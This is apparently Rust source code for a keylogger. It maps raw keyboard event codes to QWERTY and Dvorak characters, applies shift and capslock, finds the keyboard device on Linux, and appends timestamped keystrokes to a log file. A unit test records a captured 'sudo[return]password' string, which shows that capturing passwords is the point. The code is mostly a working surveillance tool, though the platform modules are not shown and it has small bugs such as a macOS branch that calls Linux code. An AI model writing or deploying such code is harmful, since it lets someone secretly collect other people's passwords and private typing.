use std::{time::SystemTime, collections::HashMap, fs::{self, OpenOptions}, io::Write};
use anyhow::Result;
mod nix;
mod mac;

fn get_key_hash_map() -> HashMap<u16, &'static str> {
    let _qwerty_map_no_mod: HashMap<u16, &str> = HashMap::from([
        (30 as u16, "a"),
        (1 as u16, "[esc]"),
        (31 as u16, "s"),
        (32 as u16, "d"),
        (33 as u16, "f"),
        (34 as u16, "g"),
        (35 as u16, "h"),
        (36 as u16, "j"),
        (37 as u16, "k"),
        (38 as u16, "l"),
        (39 as u16, ";"),
        (40 as u16, "'"),
        (28 as u16, "[retun]"),
        (14 as u16, "[delete]"),
        (42 as u16, "[shift]"),
        (42 as u16, "[Lshift]"),
        (44 as u16, "z"),
        (45 as u16, "x"),
        (46 as u16, "c"),
        (47 as u16, "v"),
        (48 as u16, "b"),
        (49 as u16, "n"),
        (50 as u16, "m"),
        (51 as u16, ","),
        (52 as u16, "."),
        (53 as u16, "/"),
        (54 as u16, "[Rshift]"),
        (29 as u16, "[Lctrl]"),
        (56 as u16, "[Loption]"),
        (41 as u16, "`"),
        (2 as u16, "1"),
        (3 as u16, "2"),
        (4 as u16, "3"),
        (5 as u16, "4"),
        (6 as u16, "5"),
        (7 as u16, "6"),
        (8 as u16, "7"),
        (9 as u16, "8"),
        (10 as u16, "9"),
        (11 as u16, "0"),
        (12 as u16, "-"),
        (13 as u16, "="),
        (15 as u16, "[tab]"),
        (16 as u16, "q"),
        (17 as u16, "w"),
        (18 as u16, "e"),
        (19 as u16, "r"),
        (20 as u16, "t"),
        (21 as u16, "y"),
        (22 as u16, "u"),
        (23 as u16, "i"),
        (24 as u16, "o"),
        (25 as u16, "p"),
        (26 as u16, "["),
        (27 as u16, "]"),
        (43 as u16, "\\"),
        (58 as u16, "[capslock]"),
        (57 as u16, "[space]"),
        (103 as u16, "[uparrow]"),
        (106 as u16, "[rightarrow]"),
        (105 as u16, "[leftarrow]"),
        (108 as u16, "[downarrow]"),
        (57 as u16, "[space]"),
        (125 as u16, "[Lfunction]"),
        (126 as u16, "[Rcommand]"),
        (59 as u16, "[F1]"),
        (60 as u16, "[F2]"),
        (61 as u16, "[F3]"),
        (62 as u16, "[F4]"),
        (63 as u16, "[F5]"),
        (64 as u16, "[F6]"),
        (65 as u16, "[F7]"),
        (66 as u16, "[F8]"),
        (67 as u16, "[F9]"),
        (68 as u16, "[F0]"),
    ]);
    let _dvorak_map_no_mod: HashMap<u16, &str> = HashMap::from([
        (30 as u16, "a"),
        (1 as u16, "[esc]"),
        (31 as u16, "o"),
        (32 as u16, "e"),
        (33 as u16, "u"),
        (34 as u16, "i"),
        (35 as u16, "d"),
        (36 as u16, "h"),
        (37 as u16, "t"),
        (38 as u16, "n"),
        (39 as u16, "s"),
        (40 as u16, "-"),
        (28 as u16, "[retun]"),
        (14 as u16, "[delete]"),
        (42 as u16, "[shift]"),
        (42 as u16, "[Lshift]"),
        (44 as u16, ";"),
        (45 as u16, "q"),
        (46 as u16, "j"),
        (47 as u16, "k"),
        (48 as u16, "x"),
        (49 as u16, "b"),
        (50 as u16, "m"),
        (51 as u16, "w"),
        (52 as u16, "v"),
        (53 as u16, "z"),
        (54 as u16, "[Rshift]"),
        (29 as u16, "[Lctrl]"),
        (56 as u16, "[Loption]"),
        (41 as u16, "`"),
        (2 as u16, "1"),
        (3 as u16, "2"),
        (4 as u16, "3"),
        (5 as u16, "4"),
        (6 as u16, "5"),
        (7 as u16, "6"),
        (8 as u16, "7"),
        (9 as u16, "8"),
        (10 as u16, "9"),
        (11 as u16, "0"),
        (12 as u16, "["),
        (13 as u16, "]"),
        (15 as u16, "[tab]"),
        (16 as u16, "'"),
        (17 as u16, ","),
        (18 as u16, "."),
        (19 as u16, "p"),
        (20 as u16, "y"),
        (21 as u16, "f"),
        (22 as u16, "g"),
        (23 as u16, "c"),
        (24 as u16, "r"),
        (25 as u16, "l"),
        (26 as u16, "/"),
        (27 as u16, "="),
        (43 as u16, "\\"),
        (58 as u16, "[capslock]"),
        (57 as u16, "[space]"),
        (103 as u16, "[uparrow]"),
        (106 as u16, "[rightarrow]"),
        (105 as u16, "[leftarrow]"),
        (108 as u16, "[downarrow]"),
        (57 as u16, "[space]"),
        (125 as u16, "[Lfunction]"),
        (126 as u16, "[Rcommand]"),
        (59 as u16, "[F1]"),
        (60 as u16, "[F2]"),
        (61 as u16, "[F3]"),
        (62 as u16, "[F4]"),
        (63 as u16, "[F5]"),
        (64 as u16, "[F6]"),
        (65 as u16, "[F7]"),
        (66 as u16, "[F8]"),
        (67 as u16, "[F9]"),
        (68 as u16, "[F0]"),
    ]);
    return _dvorak_map_no_mod;
}
fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
    // let special_chars = "1234567890[]/=\\;',.`";
    let shift_mapping: HashMap<&str, &str> = HashMap::from([
        ("1", "!"),
        ("2", "@"),
        ("3", "#"),
        ("4", "$"),
        ("5", "%"),
        ("6", "^"),
        ("7", "&"),
        ("8", "*"),
        ("9", "("),
        ("0", ")"),
        ("[", "{"),
        ("]", "}"),
        ("/", "?"),
        ("=", "+"),
        ("\\", "|"),
        ("'", "\""),
        (",", "<"),
        (".", ">"),
        ("`", "~"),
        ("-", "_"),
    ]);

    let mut res = key_char.clone().to_string();
    if shift && shift_mapping.contains_key(&key_char) {
        res = shift_mapping[&key_char].to_string();
    } else if shift || capslock {
        res = key_char.to_uppercase();
    }
    Ok(res)
}

fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()> {
    let time_now: u64;
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(n) => time_now = n.as_secs(),
        Err(_) => panic!("SystemTime before UNIX EPOCH!"),
    }
    println!("{}", format!("{}: {}", time_now, captured_keys_buffer));
    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(log_file)
        .unwrap();

    write!(file, "{}", format!("{}: {}\n", time_now, captured_keys_buffer))?;
    Ok(())
}

pub(crate) fn start_keylogger(log_file: String, timeout: u64) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let keyboard_device_path = nix::nix_find_keyboard_device();
        let _res = nix::nix_log_keys(keyboard_device_path.unwrap(), log_file, timeout);    
    }
    #[cfg(target_os = "macos")]
    {
        let keyboard_device_path = nix::nix_find_keyboard_device();
        let _res = nix::nix_log_keys(keyboard_device_path.unwrap(), log_file, timeout);    
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use std::io::{BufReader, BufRead};

    use super::*;
    use tempfile::NamedTempFile;

    #[test]
    fn test_log_keys_to_disk() -> Result<()> {
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap());
        let _res = log_keys_to_disk("sudo[return]password".to_string(), path);
        let file_reader = BufReader::new(tmp_file);
        let last_line = file_reader.lines().last().unwrap()?;
        assert!(last_line.contains(": sudo[return]password"));
        Ok(())
    }
    #[test]
    fn test_set_modifier() -> Result<()> {
        let mut res = set_modifier(&'c'.to_string(), true, false, false, false, false).unwrap();
        assert_eq!('C'.to_string(), res);
        res = set_modifier(&'-'.to_string(), true, false, false, false, false).unwrap();
        assert_eq!('_'.to_string(), res);
        res = set_modifier(&'a'.to_string(), false, false, false, false, false).unwrap();
        assert_eq!("a".to_string(), res);
        res = set_modifier(&'a'.to_string(), false, true, false, false, false).unwrap();
        assert_eq!("A".to_string(), res);
        Ok(())
    }
    #[test]
    fn test_get_key_hash_map() -> Result<()> {
        Ok(())
    }
}